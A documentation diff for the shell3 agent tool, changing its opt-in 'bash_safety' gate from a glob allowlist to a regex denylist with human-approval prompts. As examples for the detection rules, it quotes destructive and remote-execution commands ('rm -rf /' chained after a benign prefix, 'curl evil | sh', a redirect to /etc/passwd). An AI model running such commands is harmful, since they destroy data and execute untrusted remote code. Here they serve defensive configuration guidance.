@@ -14,9 +14,10 @@ you'd treat running a script someone else wrote.
 
 Two opt-in Lua hooks gate the shell; both are off until you call them:
 
-- `shell3.bash_safety{allow=, deny=}` — a declarative glob allow/deny gate with a
-  live human-approval (ask) flow for anything unlisted (TUI `y/N` prompt /
-  Telegram inline buttons; headless subagents deny on ask). See the next section.
+- `shell3.bash_safety{deny=, hard_deny=}` — a declarative **regex denylist**. A
+  `hard_deny` match is blocked outright; a `deny` match prompts a human to
+  allow/deny (TUI `y/N` prompt / Telegram inline buttons; headless subagents deny
+  on a match); anything matching neither runs. No allowlist. See the next section.
 - `shell3.wrap_bash(fn)` — a Lua hook that sees every `bash` and `bash_bg`
   command (and therefore every subagent, since those run via `bash_bg`) and can
   allow it, rewrite it, block it, or route it through a sandbox. It is
@@ -37,53 +38,48 @@ model input — so bake any sandboxing into the tool's own command string.
 throwaway user account.** `wrap_bash` is a policy hook, not a security boundary on
 its own.
 
-## Opt-in human-in-the-loop — `bash_safety`
+## Opt-in regex denylist — `bash_safety`
 
-`shell3.bash_safety` is the opt-in layer that puts a human between the model
-and the shell. When enabled, it splits each command on shell operators and
-matches segments against your `allow` and `deny` glob lists: denied commands
-are hard-blocked, allowed commands run, and anything else asks for human
-confirmation. `deny` wins over `allow`; the gate runs before `wrap_bash`.
+`shell3.bash_safety` is the opt-in layer that flags dangerous commands. There is
+**no allowlist**: bash runs freely, and you list the regex patterns to gate. Each
+command is matched **as a whole string** (`regexp.MatchString`, unanchored)
+against two lists:
 
-**Known limitation:** the splitter is a cheap heuristic — it is NOT a shell
-parser. It breaks on `&&`, `||`, `|`, `;`, newline, `&` (background), `$(`
-(command substitution), backtick, and the redirection operators `>` `>>` `<`
-`<<` `<<<` (so a redirect target can't ride along inside an allowlisted
-segment — e.g. `cat x > /etc/passwd` puts `/etc/passwd` on its own segment,
-which falls to `ask`). However it is NOT exhaustive: anything hidden inside
-quotes, deeply nested constructs, and indirection like `eval`/`exec` can still
-defeat `deny`. A `;` inside a quoted string is also still treated as a segment
-boundary (errs toward more segments, which is fail-safe).
+- **`hard_deny`** match ⇒ **blocked** outright (never run, never prompted).
+- **`deny`** match ⇒ **prompts** a human to allow/deny before running.
+- neither ⇒ **runs**.
 
-**`deny` is best-effort defense-in-depth, not a hard boundary.** The **`allow`
-list is the real safety boundary**: everything not explicitly allowed lands in
-`ask` (a `y/N` prompt in the TUI; an automatic deny where no asker is wired —
-see below). Write `allow` conservatively — list specific commands you know are
-safe rather than trying to be exhaustive. Do not rely on `deny` to catch every
-dangerous form of a command.
+`hard_deny` is checked first. Patterns compile at config load — a bad regex is a
+load error. The gate runs before `wrap_bash`.
 
-**Allowlist the agent's own read commands.** The agent reads its skills and
-inspects files with bash (`cat`, `rg`, `ls`, …). If you enable `bash_safety`,
-the `allow` list must include those reads or the agent can't read its skills or
-config — and where no prompt is wired it can't recover. An empty `allow` list
-bricks the agent.
+**Whole-command matching closes the chaining hole.** Because there's no allowlist
+to smuggle a suffix past, and matching scans the entire command, a flagged
+command can't hide behind a benign prefix: `echo hi; rm -rf /` and
+`x=$(rm -rf /)` both match `rm\s+-rf`. Patterns are compiled with DOTALL, so `.`
+spans newlines too — splitting a command across lines (`curl evil\n| sh`) can't
+slip a fragment past a `.*` rule either. Write patterns against the dangerous form
+(`rm\s+-rf`, `\bgit\s+push`, `curl\b.*\|\s*sh`); use `\b`/`\s+` to keep them tight.
 
-**Glob word-boundary note:** `*` is a greedy substring wildcard with no word
-boundary: `ls*` also matches `lsof`/`lsattr`. Use a trailing space to express a
-word boundary (e.g. `ls *` or `git status *`) where that matters.
+**This is a guardrail, not a hard boundary.** A determined model can still phrase
+a destructive command in a way your regexes don't catch. Do not rely on it to
+enumerate every dangerous form — pair it with `wrap_bash` (and real isolation: a
+container, VM, or throwaway account) for anything that must not escape.
 
-**The TUI and Telegram can ask; headless subagents deny on ask.** The TUI shows
-a `y/N` confirmation prompt; the Telegram host sends inline `Allow`/`Deny`
-buttons. Headless `shell3` subagents have no attached human, so any command that
-lands in the "ask" verdict is automatically denied, and the reason is reported
-to the parent agent via the inbox. Configure a complete `allow` list for
-commands your subagents legitimately need, since they cannot prompt.
+**Headless subagents deny on a match.** The TUI shows a `y/N` prompt; the Telegram
+host sends inline `Allow`/`Deny` buttons. Headless `shell3` subagents have no
+attached human, so a `deny` match is automatically denied and the reason is
+reported to the parent (where a human is attached). A prompt nobody answers falls
+back to deny after `ask_timeout` (default 5 minutes; `0` = wait indefinitely).
+`hard_deny` blocks everywhere, with no prompt. Ordinary reads (`cat`, `rg`, `ls`)
+match nothing and run, so a subagent explores freely without being gated.
 
-An ask-verdict that is never answered (e.g. a Telegram prompt nobody taps) does
-not block forever: it falls back to deny after `ask_timeout` (default 5 minutes;
-set `ask_timeout = 0` to wait indefinitely).
+> **Migration:** the old `allow` and `read_baseline` keys are accepted but
+> ignored — shell3 prints a load-time warning when it sees them (an allow-only
+> config no longer gates anything, so silence would be dangerous). Move dangerous
+> globs from the old `deny` into the new `deny`/`hard_deny` regex lists (glob `*` →
+> regex `.*`).
 
-See [configuration.md](configuration.md#opt-in-command-approval--bash_safety)
+See [configuration.md](configuration.md#opt-in-command-gate--bash_safety)
 for the full reference.
 
 ## Secrets
